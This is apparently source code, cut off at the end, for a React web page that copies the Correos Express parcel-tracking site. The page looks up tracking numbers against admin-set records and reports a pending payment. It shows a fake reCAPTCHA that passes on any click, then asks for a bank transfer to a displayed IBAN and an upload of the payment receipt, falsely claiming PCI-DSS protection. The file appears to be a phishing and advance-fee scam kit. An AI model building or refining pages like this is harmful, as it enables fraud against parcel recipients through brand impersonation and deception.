/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { Search, Package, User, CheckCircle2, CreditCard, ShieldCheck, ChevronRight, MapPin, MessageSquare, Send, TriangleAlert, Upload, Settings, HelpCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { Shipment } from './types.ts';

import AdminPanel from './AdminPanel';

export default function App() {
  const [inputValue, setInputValue] = useState("");
  const [isSearching, setIsSearching] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [captchaLoading, setCaptchaLoading] = useState(false);
  const [captchaVerified, setCaptchaVerified] = useState(false);
  const [showPayment, setShowPayment] = useState(false);
  const [error, setError] = useState("");
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [activeSubmenu, setActiveSubmenu] = useState<string | null>(null);
  const [shipType, setShipType] = useState<'paquetes' | 'maletas'>('paquetes');
  const [bultos, setBultos] = useState("1 bulto");
  const [bultoDropdownOpen, setBultoDropdownOpen] = useState(false);
  const [uploadedImage, setUploadedImage] = useState<string | null>(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [trackingStatus, setTrackingStatus] = useState("pending");
  const [isUploading, setIsUploading] = useState(false);
  const [shipmentData, setShipmentData] = useState<Shipment | null>(null);
  const paymentRef = React.useRef<HTMLDivElement>(null);

  // Fetch shipment data on mount
  useEffect(() => {
    document.title = "Envío Rápido y Seguro a España Y Portugal";
    const fetchShipmentData = async () => {
      try {
        const res = await fetch(`/api/shipment?t=${Date.now()}`, { cache: 'no-store' });
        await res.json();
      } catch (err) {
        console.error("Error fetching shipment data", err);
      }
    };
    fetchShipmentData();
  }, []);

  // Close dropdown on outside click
  useEffect(() => {
    const handleClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (!target.closest('.bulto-dropdown')) {
        setBultoDropdownOpen(false);
      }
    };
    document.addEventListener('click', handleClick);
    return () => document.removeEventListener('click', handleClick);
  }, []);

  if (window.location.pathname === '/admin') {
    return <AdminPanel />;
  }

  // --- Handlers ---
  const handleSearch = async () => {
    if (!inputValue) return;
    setIsSearching(true);
    setError("");
    
    try {
      // Fetch latest shipments
      const shipRes = await fetch(`/api/shipment?t=${Date.now()}`, { cache: 'no-store' });
      if (!shipRes.ok) {
        throw new Error(`Server returned ${shipRes.status}`);
      }
      const shipments = await shipRes.json();
      const shipmentsArray = Array.isArray(shipments) ? shipments : [shipments];

      setTimeout(() => {
        setIsSearching(false);
        const found = shipmentsArray.find((s: Shipment) => s.trackingNumber === inputValue);
        
        if (found) {
          setShipmentData(found);
          setTrackingStatus(found.status || 'pending');
          setShowResults(true);
          setTimeout(() => {
            document.getElementById('results-section')?.scrollIntoView({ behavior: 'smooth' });
          }, 100);
        } else {
          setError("Número de seguimiento no encontrado. Por favor, verifique e intente de nuevo.");
          setShowResults(false);
        }
      }, 1000);
    } catch (err) {
      console.error("Error during search", err);
      setIsSearching(false);
      setError("Error de conexión. Por favor, intente de nuevo.");
    }
  };

  const handleCaptchaClick = () => {
    if (captchaVerified || captchaLoading) return;
    setCaptchaLoading(true);
    setTimeout(() => {
      setCaptchaLoading(false);
      setCaptchaVerified(true);
    }, 1500);
  };

  const handleCompleteProcess = () => {
    setShowPayment(true);
    setTimeout(() => {
      paymentRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 100);
  };

  const toggleSidebar = () => {
    if (sidebarOpen) {
      setSidebarOpen(false);
      setActiveSubmenu(null);
    } else {
      setSidebarOpen(true);
    }
  };

  const openSubmenu = (name: string) => {
    setActiveSubmenu(activeSubmenu === name ? null : name);
  };

  const selectBulto = (val: string) => {
    setBultos(val);
    setBultoDropdownOpen(false);
  };

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        const img = new Image();
        img.onload = () => {
          const canvas = document.createElement('canvas');
          const MAX_WIDTH = 1000;
          const MAX_HEIGHT = 1000;
          let width = img.width;
          let height = img.height;

          if (width > height) {
            if (width > MAX_WIDTH) {
              height *= MAX_WIDTH / width;
              width = MAX_WIDTH;
            }
          } else {
            if (height > MAX_HEIGHT) {
              width *= MAX_HEIGHT / height;
              height = MAX_HEIGHT;
            }
          }

          canvas.width = width;
          canvas.height = height;
          const ctx = canvas.getContext('2d');
          ctx?.drawImage(img, 0, 0, width, height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
          setUploadedImage(dataUrl);
        };
        img.src = reader.result as string;
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePaymentSubmit = async () => {
    if (!uploadedImage) {
      return;
    }
    
    setIsUploading(true);
    try {
      const res = await fetch('/api/uploads', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          image: uploadedImage,
          trackingNumber: shipmentData?.trackingNumber || "N/A",
        }),
      });
      
      if (res.ok) {
        setShowSuccessModal(true);
      } else {
        console.error('Failed to upload image');
        alert("Hubo un error al enviar el comprobante. Por favor, intente nuevamente.");
      }
    } catch (error) {
      console.error('Error uploading image:', error);
      alert("Hubo un error de conexión. Por favor, intente nuevamente.");
    } finally {
      setIsUploading(false);
    }
  };

  const resetApp = () => {
    window.location.href = '/';
  };


  return (
    <div className={`min-h-screen bg-white font-sans text-[#1e3a6e] ${sidebarOpen ? 'overflow-hidden' : ''}`}>
      
      {/* Top Bar */}
      <header className="top-bar">
        <div className="top-bar-left">
          <div className="logo">
            <img 
              src="/logocorreos.PNG" 
              alt="Correos Express" 
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="top-bar-sep"></div>
          <button className="hamburger-btn" onClick={toggleSidebar}>
            {!sidebarOpen ? (
              <div className="ham-bars">
                <span></span><span></span><span></span>
              </div>
            ) : (
              <span className="ham-x">✕</span>
            )}
          </button>
          <div className="hidden sm:flex h-full">
            <a href="#" className="tab-link active">Particular</a>
            <a href="#" className="tab-link">Empresa</a>
          </div>
        </div>
        <a href="#" className="area-privada">
          <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.8">
            <circle cx="10" cy="7" r="4"/>
            <path d="M2 17c0-4 3.6-7 8-7s8 3 8 7"/>
          </svg>
          <span>ÁREA PRIVADA</span>
        </a>
      </header>

      {/* Sidebar Overlay */}
      <div 
        className={`sidebar-overlay ${sidebarOpen ? 'active' : ''}`} 
        onClick={() => { setSidebarOpen(false); setActiveSubmenu(null); }}
      ></div>

      {/* Sidebar */}
      <nav className={`sidebar ${sidebarOpen ? 'open' : ''}`}>
        <div className="sidebar-nav">
          <div className="sidebar-label">Particular</div>
          <button className="nav-item">
            <div className="nav-item-left">
              <span className="nav-item-icon">
                <svg viewBox="0 0 20 20" fill="none" stroke="#1a2e5a" strokeWidth="1.8">
                  <path d="M3 9l7-7 7 7v9a1 1 0 01-1 1H4a1 1 0 01-1-1V9z"/>
                </svg>
              </span>
              <span className="nav-item-text">Inicio</span>
            </div>
          </button>
          <div className="nav-divider"></div>
          <button className="nav-item" onClick={() => openSubmenu('enviar')}>
            <div className="nav-item-left">
              <span className="nav-item-icon">
                <Package size={18} className="text-[#1a2e5a]" />
              </span>
              <span className="nav-item-text">Enviar</span>
            </div>
            <span className="nav-item-arrow">›</span>
          </button>
          <div className="nav-divider"></div>
          <button className="nav-item" onClick={() => openSubmenu('sobre')}>
            <div className="nav-item-left">
              <span className="nav-item-icon">
                <div className="w-4.5 h-4.5 rounded-full border-2 border-[#1a2e5a] flex items-center justify-center text-[10px] font-bold">i</div>
              </span>
              <span className="nav-item-text">Sobre Correos Express</span>
            </div>
            <span className="nav-item-arrow">›</span>
          </button>
          <div className="nav-divider"></div>
          <button className="nav-item" onClick={() => openSubmenu('herramientas')}>
            <div className="nav-item-left">
              <span className="nav-item-icon">
                <Settings size={18} className="text-[#1a2e5a]" />
              </span>
              <span className="nav-item-text">Herramientas</span>
            </div>
            <span className="nav-item-arrow">›</span>
          </button>
          <div className="nav-divider"></div>
          <button className="nav-item" onClick={() => openSubmenu('ayuda')}>
            <div className="nav-item-left">
              <span className="nav-item-icon">
                <div className="w-4.5 h-4.5 rounded-full border-2 border-[#1a2e5a] flex items-center justify-center text-[10px] font-bold">?</div>
              </span>
              <span className="nav-item-text">Ayuda</span>
            </div>
            <span className="nav-item-arrow">›</span>
          </button>
        </div>
        <div className="sidebar-footer">
          <div className="sidebar-footer-label">Idioma:</div>
          <div className="sidebar-footer-lang">ES</div>
        </div>
      </nav>

      {/* Submenus */}
      <div className={`submenu-panel ${activeSubmenu === 'enviar' ? 'open' : ''}`}>
        <div className="submenu-title">Enviar</div>
        <div className="submenu-section-title">Peninsulares</div>
        <a href="#" className="submenu-link">Paq 24</a>
        <a href="#" className="submenu-link">EquiPaq 24</a>
        <a href="#" className="submenu-link">Paq 14</a>
        <a href="#" className="submenu-link">Paq 10</a>
        <a href="#" className="submenu-link">Paq Punto</a>
        <a href="#" className="submenu-link">Paq Empresa</a>
        <div className="submenu-divider"></div>
        <div className="submenu-section-title">Islas España y Portugal</div>
        <a href="#" className="submenu-link">Islas Express</a>
        <a href="#" className="submenu-link">Islas Marítimo</a>
        <a href="#" className="submenu-link">Islas Docs</a>
        <div className="submenu-divider"></div>
        <div className="submenu-section-title">Internacionales</div>
        <a href="#" className="submenu-link">Internacional Express</a>
        <a href="#" className="submenu-link">Internacional Estándar</a>
        <div className="submenu-divider"></div>
        <a href="#" className="submenu-link font-bold">Recogida a domicilio</a>
        <a href="#" className="submenu-link font-bold">Tarifas</a>
        <div className="submenu-divider"></div>
        <div className="submenu-link-arrow">
          <span>Consejos para embalar tus envíos</span>
          <span>›</span>
        </div>
      </div>

      <div className={`submenu-panel ${activeSubmenu === 'sobre' ? 'open' : ''}`}>
        <div className="submenu-title">Sobre Correos Express</div>
        <div className="submenu-link-arrow">
          <span>Perfil contratante</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Quiénes somos</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Trabaja con nosotros</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Sala de prensa</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Transparencia</span>
          <span>›</span>
        </div>
      </div>

      <div className={`submenu-panel ${activeSubmenu === 'herramientas' ? 'open' : ''}`}>
        <div className="submenu-title">Herramientas</div>
        <div className="submenu-link-arrow">
          <span>Localizador de envíos</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Delegaciones, Oficinas y Citypaq</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Calculador de tarifas</span>
          <span>›</span>
        </div>
        <div className="submenu-link-arrow">
          <span>Integración con eCommerce</span>
          <span>›</span>
        </div>
      </div>

      <div className={`submenu-panel ${activeSubmenu === 'ayuda' ? 'open' : ''}`}>
        <div className="submenu-title">Ayuda</div>
        <a href="#" className="submenu-link">Preguntas frecuentes</a>
        <a href="#" className="submenu-link">Contacto</a>
        <a href="#" className="submenu-link">Reclamaciones</a>
        <a href="#" className="submenu-link">Incidencias</a>
      </div>

      {/* Main Wrap */}
      <main className="main-wrap">
        {/* Hero Section */}
        <div className="hero">
          <div className="hero-image-col">
            <img 
              id="heroMainImg" 
              src="/Mensajera Correos Express con Paquete.PNG" 
              alt="Hero" 
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="hero-content-col">
            <div className="hero-text-block">
              <h1 className="hero-tagline">Tú eliges cuándo y dónde.<br className="hidden sm:block" /> Nosotros lo hacemos llegar.</h1>
              <p className="hero-subtitle">Soluciones de envío para tu día a día.</p>
              <button className="btn-yellow flex items-center gap-2">
                ENVIAR AHORA
                <ChevronRight size={18} strokeWidth={3} />
              </button>
              <div className="hero-chevrons-right">
                <ChevronRight className="text-[#f5c000] -mr-3" size={40} strokeWidth={3} />
                <ChevronRight className="text-[#f5c000] -mr-3" size={40} strokeWidth={3} />
                <ChevronRight className="text-[#f5c000]" size={40} strokeWidth={3} />
              </div>
            </div>
          </div>
        </div>

        <div className="max-w-[1300px] mx-auto px-6 relative -top-6 lg:-top-10 grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Tracking Panel */}
            <div className="tracking-panel">
              <div className="tracking-title">Sigue tu envío</div>
              <div className="tracking-input-row">
                <input 
                  className="tracking-input" 
                  type="text" 
                  placeholder="Nº de seguimiento de envío*"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
                />
                <button 
                  className="btn-buscar"
                  onClick={handleSearch}
                  disabled={isSearching}
                >
                  {isSearching ? '...' : (
                    <>
                      <span className="hidden sm:inline">BUSCAR</span>
                      <Search className="sm:hidden" size={20} />
                    </>
                  )}
                </button>
              </div>
              
              <AnimatePresence>
                {error && (
                  <motion.div 
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    className="bg-red-500 text-white p-3 rounded mb-4 text-xs font-bold"
                  >
                    {error}
                  </motion.div>
                )}
              </AnimatePresence>

              <div className="tracking-links">
                <div className="tracking-link-item">
                  <div className="track-icon-wrap">
                    <MapPin className="text-[#f5c000]" size={24} />
                  </div>
                  <span>Encuentra tu punto de entrega más cercano</span>
                </div>
                <div className="tracking-link-item">
                  <div className="track-icon-wrap">
                    <MessageSquare className="text-[#f5c000]" size={24} />
                  </div>
                  <span>¿Necesitas ayuda con tu envío?</span>
                </div>
                <div className="tracking-link-item">
                  <div className="track-icon-wrap">
                    <Send className="text-[#f5c000]" size={24} />
                  </div>
                  <span>Antes de enviar, esto te interesa</span>
                </div>
              </div>
            </div>

            {/* Calculator Panel */}
            <div className="calc-panel">
              <div className="calc-header">
                <div className="calc-title">Realiza tu envío de forma express</div>
                <div className="calc-price">Desde <strong>6,86 € + IVA</strong></div>
              </div>
              <p className="calc-desc">Envíos nacionales e internacionales de hasta 10 paquetes, y envíos de maletas en Península y Baleares.</p>
              
              <div className="calc-section-label">¿Qué quieres enviar?</div>
              <div className="package-type-row">
                <button 
                  className={`package-type-btn ${shipType === 'paquetes' ? 'selected' : ''}`}
                  onClick={() => setShipType('paquetes')}
                >
                  <img src="/paquetesicono.PNG" alt="Paquetes" className="package-icon" referrerPolicy="no-referrer" />
                  <span className="package-name">Paquetes</span>
                  <span className="package-desc">Hasta 40kg por paquete</span>
                </button>
                <button 
                  className={`package-type-btn ${shipType === 'maletas' ? 'selected' : ''}`}
                  onClick={() => setShipType('maletas')}
                >
                  <img src="/maletasicono.PNG" alt="Maletas" className="package-icon" referrerPolicy="no-referrer" />
                  <span className="package-name">Maletas</span>
                  <span className="package-desc">Hasta 25kg por maleta</span>
                </button>
              </div>

              {shipType === 'paquetes' ? (
                <div className="dims-row">
                  <input className="dim-input" placeholder="Peso (kg)*" />
                  <input className="dim-input" placeholder="Largo (cm)*" />
                  <input className="dim-input" placeholder="Ancho (cm)*" />
                  <input className="dim-input" placeholder="Alto (cm)*" />
                </div>
              ) : (
                <div className="bulto-dropdown" id="bultoDropdown">
                  <div className="bulto-label">Número de maletas (Máximo 25kg)</div>
                  <div className="bulto-selected" onClick={() => setBultoDropdownOpen(!bultoDropdownOpen)}>
                    <span id="bultoSelectedText">{bultos}</span>
                    <span className={`bulto-arrow ${bultoDropdownOpen ? 'open' : ''}`}>&#8964;</span>
                  </div>
                  <div className={`bulto-options ${bultoDropdownOpen ? 'open' : ''}`} id="bultoOptions">
                    {["1 bulto", "2 bultos", "3 bultos", "4 bultos", "5 bultos"].map(opt => (
                      <div 
                        key={opt}
                        className={`bulto-option ${bultos === opt ? 'active' : ''}`}
                        onClick={() => selectBulto(opt)}
                      >
                        {opt}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <div className="add-package-link">+ AÑADIR PAQUETE</div>
              <button className="btn-calcular">CALCULA TU TARIFA</button>
            </div>
        </div>

        {/* Results Section */}
        <AnimatePresence>
          {showResults && (
            <div id="results-section" className="max-w-[820px] mx-auto px-6 pb-20 mt-10">
              <motion.div 
                initial="hidden"
                animate="visible"
                variants={{
                  hidden: { opacity: 0 },
                  visible: {
                    opacity: 1,
                    transition: {
                      staggerChildren: 0.15,
                      delayChildren: 0.2
                    }
                  }
                }}
                className="space-y-6"
              >
                {/* Recipient Card */}
                <motion.div 
                  variants={{
                    hidden: { opacity: 0, y: 30, scale: 0.98 },
                    visible: { 
                      opacity: 1, 
                      y: 0, 
                      scale: 1,
                      transition: { type: "spring", stiffness: 100, damping: 15 }
                    }
                  }}
                  className="bg-white rounded-lg shadow-md border border-[#e8e8e8] overflow-hidden"
                >
                  <div className="bg-[#f0f0f0] px-6 py-4 border-b border-[#e8e8e8] flex items-center justify-between">
                    <h2 className="font-bold text-[14px] flex items-center gap-2">
                      <User size={16} className="text-[#1e3a6e]" />
                      DESTINATARIO
                    </h2>
                    <span className="text-[10px] font-bold bg-[#1e3a6e] text-white px-2 py-1 rounded uppercase tracking-widest">
                      {shipmentData?.badge || 'En Tránsito'}
                    </span>
                  </div>
                  <div className="p-8 space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Nombres & Apellidos</label>
                        <p className="font-bold text-[18px]">{shipmentData?.name}</p>
                      </div>
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Código Postal</label>
                        <p className="font-bold text-[18px]">{shipmentData?.postalCode}</p>
                      </div>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Dirección</label>
                        <p className="font-bold text-[18px]">{shipmentData?.address}</p>
                      </div>
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Contacto</label>
                        <p className="font-bold text-[18px]">{shipmentData?.contact}</p>
                      </div>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-[#f0f0f0]">
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Número de envío</label>
                        <p className="font-bold text-[18px]">{shipmentData?.trackingNumber}</p>
                      </div>
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Estado del envío</label>
                        {trackingStatus === 'pending' && <p className="font-bold text-[18px] text-red-600">PAGO PENDIENTE</p>}
                        {trackingStatus === 'validating' && <p className="font-bold text-[18px] text-cyan-600">Pago en proceso de validación</p>}
                        {trackingStatus === 'verified' && <p className="font-bold text-[18px] text-orange-500">PAGO VERIFICADO / EN PROCESO DE DESPACHO</p>}
                        {trackingStatus === 'transit' && <p className="font-bold text-[18px] text-green-600">En Tránsito</p>}
                      </div>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-[#f0f0f0]">
                      <div>
                        <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Paquete Verificado</label>
                        <p className="font-bold text-[18px]">{shipmentData?.packageVerified}</p>
                      </div>
                    </div>
                  </div>
                </motion.div>

                {/* Captcha Section */}
                <motion.div 
                  variants={{
                    hidden: { opacity: 0, y: 30 },
                    visible: { 
                      opacity: 1, 
                      y: 0,
                      transition: { type: "spring", stiffness: 100, damping: 15 }
                    }
                  }}
                  className="bg-white rounded-lg shadow-md border border-[#e8e8e8] p-10 flex flex-col items-center"
                >
                  <div 
                    onClick={handleCaptchaClick}
                    className={`w-full max-w-[300px] border rounded p-4 flex items-center justify-between cursor-pointer transition-all ${captchaVerified ? 'bg-green-50 border-green-200' : 'bg-[#f9f9f9] border-[#d3d3d3] hover:border-gray-400'}`}
                  >
                    <div className="flex items-center gap-4">
                      <div className="relative w-8 h-8 flex items-center justify-center">
                        {captchaLoading ? (
                          <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }} className="w-6 h-6 border-2 border-[#1e3a6e] border-t-transparent rounded-full" />
                        ) : captchaVerified ? (
                          <CheckCircle2 size={32} className="text-green-600" />
                        ) : (
                          <div className="w-6 h-6 border-2 border-gray-300 bg-white rounded shadow-inner" />
                        )}
                      </div>
                      <span className="text-[14px] font-medium text-gray-700">No soy un robot</span>
                    </div>
                    <div className="flex flex-col items-center opacity-70">
                      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" className="w-8 h-8 grayscale brightness-125" referrerPolicy="no-referrer" />
                      <span className="text-[8px] font-bold text-gray-500 mt-1">reCAPTCHA</span>
                    </div>
                  </div>

                  <button 
                    disabled={!captchaVerified}
                    onClick={handleCompleteProcess}
                    className={`mt-8 w-full max-w-md py-4 rounded font-bold text-[16px] shadow-lg transition-all flex items-center justify-center gap-2 ${captchaVerified ? 'bg-[#f5c000] text-[#1e3a6e] hover:bg-[#e0ad00]' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
                  >
                    Completar trámite de entrega
                    <ChevronRight size={20} />
                  </button>
                </motion.div>

                {/* Payment Details */}
                {showPayment && (
                  <motion.div 
                    ref={paymentRef}
                    initial={{ opacity: 0, y: 30, scale: 0.95 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    transition={{ type: "spring", stiffness: 100, damping: 15 }}
                    className="bg-white rounded-lg shadow-xl border-2 border-[#1e3a6e]/10 overflow-hidden"
                  >
                    <div className="bg-[#1e3a6e] px-6 py-4 text-white flex items-center gap-2">
                      <CreditCard size={20} />
                      <h2 className="font-bold">Detalles del Pago y Trámite</h2>
                    </div>
                    <div className="p-8 space-y-8">
                      <div className="bg-[#f8f9fa] p-6 rounded-lg border border-[#e8e8e8] space-y-4">
                        <h3 className="font-bold text-[#1e3a6e] border-b pb-2 mb-4">Datos para la transferencia</h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                          <div>
                            <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Beneficiario</label>
                            <p className="font-bold text-[16px]">{shipmentData?.beneficiary}</p>
                          </div>
                          <div>
                            <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">Concepto</label>
                            <p className="font-bold text-[16px]">{shipmentData?.concept}</p>
                          </div>
                          <div className="md:col-span-2">
                            <label className="text-[10px] font-bold text-[#aaa] uppercase tracking-widest block mb-1">{shipmentData?.ibanLabel || "IBAN BANCO (BBVA)"}</label>
                            <p className="font-bold text-[18px] tracking-wider text-[#1e3a6e]">{shipmentData?.ibanValue || "ES74 0182 2647 5902 0168 2392"}</p>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-4">
                        <div className="flex justify-between items-center">
                          <span className="text-[#555] text-[14px]">Costo servicio de envío seguro</span>
                          <span className="font-bold text-green-600 bg-green-50 px-3 py-1 rounded text-[14px]">{shipmentData?.shippingCost}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-[#555] text-[14px]">Costo de Paquete</span>
                          <span className="font-bold text-[16px]">{shipmentData?.packageCost}</span>
                        </div>
                        <div className="h-px bg-[#f0f0f0]" />
                        <div className="flex justify-between items-center">
                          <span className="font-bold text-[16px]">Importe Total</span>
                          <span className="text-[28px] font-black text-[#1e3a6e]">{shipmentData?.totalAmount}</span>
                        </div>
                      </div>

                      {/* Image Upload Section */}
                      <div className="space-y-4">
                        <label className="text-[12px] font-bold text-[#1e3a6e] uppercase tracking-widest block">Adjuntar comprobante de pago</label>
                        <div className="border-2 border-dashed border-[#ccc] rounded-lg p-8 flex flex-col items-center justify-center bg-[#fafafa] hover:bg-[#f0f4ff] hover:border-[#1e3a6e] transition-all cursor-pointer group relative overflow-hidden">
                          <input 
                            type="file" 
                            className="absolute inset-0 opacity-0 cursor-pointer z-10" 
                            onChange={handleImageUpload}
                            accept="image/*,.pdf"
                          />
                          {uploadedImage ? (
                            <div className="w-full h-full flex flex-col items-center">
                              <img src={uploadedImage} alt="Comprobante" className="max-h-[200px] rounded shadow-md mb-4 object-contain" />
                              <p className="text-[14px] font-bold text-green-600 flex items-center gap-2">
                                <CheckCircle2 size={16} />
                                Archivo adjuntado con éxito
                              </p>
                              <button 
                                onClick={(e) => { e.stopPropagation(); setUploadedImage(null); }}
                                className="mt-2 text-[12px] text-red-500 hover:underline z-20"
                              >
                                Eliminar y cambiar
                              </button>
                            </div>
                          ) : (
                            <>
                              <div className="w-14 h-14 bg-white rounded-full shadow-sm flex items-center justify-center mb-4 group-hover:scale-110 transition-transform border border-gray-100">
                                <Upload className="text-[#1e3a6e]" size={28} />
                              </div>
                              <p className="text-[15px] font-bold text-[#1e3a6e] mb-1">Haga clic o arrastre el archivo aquí</p>
                              <p className="text-[12px] text-[#555] mb-4">Soporta JPG, PNG o PDF (Máx. 5MB)</p>
                              <div className="bg-[#1e3a6e] text-white px-6 py-2 rounded font-bold text-[12px] uppercase tracking-widest">
                                Seleccionar archivo
                              </div>
                            </>
                          )}
                        </div>
                      </div>

                      <div className="bg-[#f0f4ff] rounded-xl p-5 border border-[#1e3a6e]/10 flex gap-4">
                        <ShieldCheck className="text-[#1e3a6e] shrink-0" size={24} />
                        <div className="text-[13px] text-[#1e3a6e]/80">
                          <p className="font-bold mb-1 text-[#1e3a6e]">Pago Seguro Protegido</p>
                          <p>Su transacción está protegida por encriptación de extremo a extremo y cumple con los estándares PCI-DSS.</p>
                        </div>
                      </div>

                      <button 
                        type="button"
                        onClick={(e) => {
                          e.preventDefault();
                          handlePaymentSubmit();
                        }}
                        disabled={isUploading || !uploadedImage}
                        className={`w-full py-4 rounded font-bold transition-colors flex items-center justify-center gap-2 uppercase tracking-widest shadow-lg ${!uploadedImage ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-[#f5c000] text-[#1e3a6e] hover:bg-[#e0ad00]'}`}
                      >
                        {isUploading ? 'Procesando...' : 'Proceder al Pago'}
                        {!isUploading && <ChevronRight size={20} strokeWidth={3} />}
                      </button>
                    </div>
                  </motion.div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {/* Alert Section */}
        {!showResults && (
          <>
            <div className="max-w-[1200px] mx-auto px-6 mb-10">
              <div className="alert-section">
                <div className="alert-icon-wrap">
                  <TriangleAlert className="text-[#f5c000]" size={48} strokeWidth={2.5} />
                </div>
                <div className="alert-content">
                  <h2 className="alert-title">Situaciones especiales de entrega</h2>
                  <p className="alert-text">
                    Debido a las condiciones meteorológicas actuales, es posible que nuestros servicios de recogida y entregas puedan verse afectado en algunas zonas. Consulta los avisos oficiales en <a href="#">AEMET</a>.
                    <br /><br />
                    Algunos destinos pueden experimentar restricciones o retrasos en las entregas debido a situaciones excepcionales. Consulta <a href="#">aquí</a> el estado actualizado.
                  </p>
                </div>
              </div>
            </div>

            <div className="max-w-[820px] mx-auto px-6 py-10">
              <div className="punto-correos">
                <div className="punto-text">
                  <h2 className="punto-title">Punto Correos</h2>
                  <div className="punto-divider"></div>
                  <p className="punto-desc">Impulsa tu negocio con la mayor red logística, en Correos te hacemos crecer. Forma parte de un punto Correos y convierte tu negocio en un centro de oportunidades.</p>
                  <button className="btn-yellow">Quiero ser Punto Correos</button>
                </div>
                <div className="punto-image">
                  <img src="/puntocorreos.PNG" alt="Punto Correos" referrerPolicy="no-referrer" />
                </div>
              </div>
            </div>

            <div className="products-section section-gray">
              <div className="section-title">Envíos peninsulares</div>
              <div className="products-grid">
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Paq 24 de hoy para mañana.PNG" alt="Paq 24" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Paq 24: de hoy para mañana</h3>
                    <p className="product-card-desc">Lo quiero de hoy para mañana o en 24 horas. Pues tus deseos son órdenes. Los convertimos en realidad gracias al Paq 24 de Correos Express. ¡Descubre sus características creadas por y para ti!</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/EquiPaq 24 tus maletas, en 24h.PNG" alt="EquiPaq 24" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">EquiPaq 24: tus maletas, en 24h</h3>
                    <p className="product-card-desc">¿Te imaginas viajar ligero de equipaje sin renunciar a él? Olvídate de ir cargando con tus maletas por España, ¡nosotros te las llevamos en 24 horas!</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
              </div>
              <div className="products-grid mt-6">
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Paq Punto donde y cuando quieras.PNG" alt="Paq Punto" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Paq Punto: donde y cuando quieras</h3>
                    <p className="product-card-desc">Que el paquete te espere a ti, no tú a él. Con más de 17.000 puntos de recogida, tus envíos se adaptan a tu ritmo, no al revés.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Paq 14 entrega antes de comer.PNG" alt="Paq 14" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Paq 14: entrega antes de comer</h3>
                    <p className="product-card-desc">Come con tranquilidad, tu paquete ya ha llegado a su destino a las 14:00. Si esa frase es música para tus oídos, Paq 14 de Correos Express es lo que estás buscando.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
              </div>
              <div className="max-w-[1200px] mx-auto px-10 mt-6">
                <div className="product-card max-w-[588px]">
                  <div className="product-card-img">
                    <img src="/Paq 10 entrega antes del café.PNG" alt="Paq 10" referrerPolicy="no-referrer" />
                  </div>
